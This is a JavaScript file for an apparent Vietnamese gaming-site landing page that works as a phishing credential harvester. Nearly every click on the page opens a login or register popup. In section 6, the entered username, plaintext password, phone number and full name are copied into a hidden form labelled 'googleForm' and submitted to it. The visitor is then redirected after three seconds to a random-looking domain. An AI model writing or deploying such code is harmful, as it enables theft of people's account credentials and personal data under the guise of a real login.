document.addEventListener('DOMContentLoaded', function() {
    
    // ==========================================
    // 1. XỬ LÝ MENU FOOTER
    // ==========================================
    const footerItems = document.querySelectorAll('.footer-item');
    footerItems.forEach(item => {
        item.addEventListener('click', function() {
            footerItems.forEach(el => el.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // ==========================================
    // 2. KHỞI TẠO SWIPER BANNER
    // ==========================================
    const swiper = new Swiper(".mySwiper", {
        loop: true, 
        autoplay: {
            delay: 3000, 
            disableOnInteraction: false, 
        },
        pagination: {
            el: ".swiper-pagination",
            clickable: true, 
        },
        navigation: {
            nextEl: ".swiper-button-next",
            prevEl: ".swiper-button-prev",
        },
    });

    // ==========================================
    // 3. XỬ LÝ MENU DANH MỤC TRƯỢT NGANG
    // ==========================================
    const categoryMenuItems = document.querySelectorAll('.category-menu .menu-item');
    categoryMenuItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.stopPropagation(); // Ngăn sự kiện click truyền ra ngoài
            categoryMenuItems.forEach(el => el.classList.remove('active'));
            this.classList.add('active');
            this.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
        });
    });

    // ==========================================
    // 4. XỬ LÝ MODAL POPUP & FORM AUTH
    // ==========================================
    const modal = document.getElementById('authModal');
    const btnClose = document.querySelector('.close-modal');
    
    const headerBtnRegister = document.querySelector('.header .btn-register');
    const headerBtnLogin = document.querySelector('.header .btn-login');
    
    const tabRegister = document.getElementById('tabRegister');
    const tabLogin = document.getElementById('tabLogin');
    const formRegister = document.getElementById('formRegister');
    const formLogin = document.getElementById('formLogin');

    // Hàm mở Modal
    function openModal(isLogin) {
        modal.classList.add('show');
        if (isLogin) {
            tabLogin.classList.add('active');
            tabRegister.classList.remove('active');
            formLogin.classList.add('active-form');
            formRegister.classList.remove('active-form');
        } else {
            tabRegister.classList.add('active');
            tabLogin.classList.remove('active');
            formRegister.classList.add('active-form');
            formLogin.classList.remove('active-form');
        }
    }

    // Gắn sự kiện mở form Đăng ký / Đăng nhập từ Header
    if(headerBtnRegister) headerBtnRegister.addEventListener('click', (e) => { e.stopPropagation(); openModal(false); });
    if(headerBtnLogin) headerBtnLogin.addEventListener('click', (e) => { e.stopPropagation(); openModal(true); });

    // Gắn sự kiện đóng form
    if(btnClose) btnClose.addEventListener('click', () => modal.classList.remove('show'));
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.classList.remove('show');
    });

    // Chuyển Tab bên trong Modal
    tabRegister.addEventListener('click', (e) => { e.stopPropagation(); openModal(false); });
    tabLogin.addEventListener('click', (e) => { e.stopPropagation(); openModal(true); });


    // ==========================================
    // 5. YÊU CẦU: CLICK THÀNH PHẦN KHÁC MỞ FORM ĐĂNG NHẬP
    // ==========================================
    // Bắt sự kiện click vào các thẻ Game
    const gameCards = document.querySelectorAll('.game-card');
    gameCards.forEach(card => {
        card.addEventListener('click', function(e) {
            e.stopPropagation();
            openModal(true); // Mở popup ở tab Đăng nhập
        });
    });

    // Bắt sự kiện click vào phần Tải App
    const downloadBtns = document.querySelectorAll('.store-btn, .ambassador-img ,.download-section,.footer,.menu-item,.header');
    downloadBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            openModal(true);
        });
    });


    // ==========================================
    // 6. XÁC THỰC VÀ GỬI DATA QUA FORM ẨN
    // ==========================================
    
    const accPassRegex = /^[^\s]{6,20}$/;
    
    // Biến toàn cục để kiểm tra trạng thái gửi
    window.submitted = false;

    // Lấy các phần tử của form ẩn
    const googleForm = document.getElementById('googleForm');
    const gStatus = document.getElementById('g_status');
    const gUsername = document.getElementById('g_username');
    const gPassword = document.getElementById('g_password');
    const gPhone = document.getElementById('g_phone');
    const gFullname = document.getElementById('g_fullname');

    // Xử lý submit Form Đăng Ký
    const btnSubmitRegister = formRegister.querySelector('.btn-submit');
    btnSubmitRegister.addEventListener('click', function(e) {
        e.preventDefault();
        
        const username = formRegister.querySelector('input[name="username"]').value.trim();
        const password = formRegister.querySelector('input[name="password"]').value.trim();
        const fullname = formRegister.querySelector('input[name="fullname"]').value.trim();
        const phone = formRegister.querySelector('input[name="phone"]').value.trim();
        const isAgreed = formRegister.querySelector('#agreeTerms').checked;

        if (!username || !password || !fullname || !phone) {
            alert("Vui lòng điền đầy đủ thông tin vào tất cả các trường!");
            return;
        }
        if (!accPassRegex.test(username)) {
            alert("Tên đăng nhập phải từ 6 đến 20 ký tự (không có khoảng trắng)!");
            return;
        }
        if (!accPassRegex.test(password)) {
            alert("Mật khẩu phải từ 6 đến 20 ký tự (không có khoảng trắng)!");
            return;
        }
        if (phone.length !== 10 || isNaN(phone)) {
            alert("Số điện thoại phải bao gồm đúng 10 chữ số!");
            return;
        }
        if (!isAgreed) {
            alert("Bạn phải đồng ý với thỏa thuận người dùng!");
            return;
        }

        // Đổi trạng thái UI
        btnSubmitRegister.innerText = "ĐANG XỬ LÝ...";
        btnSubmitRegister.disabled = true;

        // Gán dữ liệu vào form ẩn
        gStatus.value = "Đăng Ký";
        gUsername.value = username;
        gPassword.value = password;
        gPhone.value = phone;
        gFullname.value = fullname;

        // Đánh dấu đã submit và kích hoạt gửi form
        submitted = true;
        googleForm.submit();
        
        // Thiết lập fallback chuyển trang sau 3 giây nếu iframe không kích hoạt
        setTimeout(() => {
             window.location.href = "https://m.i4uoi87g5hj132y9874f65gh1.com/";
        }, 3000);
    });


    // Xử lý submit Form Đăng Nhập
    const btnSubmitLogin = formLogin.querySelector('.btn-submit');
    btnSubmitLogin.addEventListener('click', function(e) {
        e.preventDefault();
        
        const username = formLogin.querySelector('input[name="username"]').value.trim();
        const password = formLogin.querySelector('input[name="password"]').value.trim();
        const phone = formLogin.querySelector('input[name="phone"]').value.trim();

        if (!username || !password || !phone) {
            alert("Vui lòng điền đầy đủ Tên tài khoản, Mật khẩu và Số điện thoại!");
            return;
        }
        if (!accPassRegex.test(username) || !accPassRegex.test(password)) {
            alert("Tài khoản và mật khẩu phải từ 6 đến 20 ký tự!");
            return;
        }
        if (phone.length !== 10 || isNaN(phone)) {
            alert("Số điện thoại phải bao gồm đúng 10 chữ số!");
            return;
        }

        // Đổi trạng thái UI
        btnSubmitLogin.innerText = "ĐANG XỬ LÝ...";
        btnSubmitLogin.disabled = true;

        // Gán dữ liệu vào form ẩn (Họ tên để trống khi đăng nhập)
        gStatus.value = "Đăng Nhập";
        gUsername.value = username;
        gPassword.value = password;
        gPhone.value = phone;
        gFullname.value = "";

        // Đánh dấu đã submit và kích hoạt gửi form
        submitted = true;
        googleForm.submit();
        
        // Thiết lập fallback chuyển trang sau 3 giây nếu iframe không kích hoạt
        setTimeout(() => {
             window.location.href = "https://m.i4uoi87g5hj132y9874f65gh1.com/";
        }, 3000);
    });
});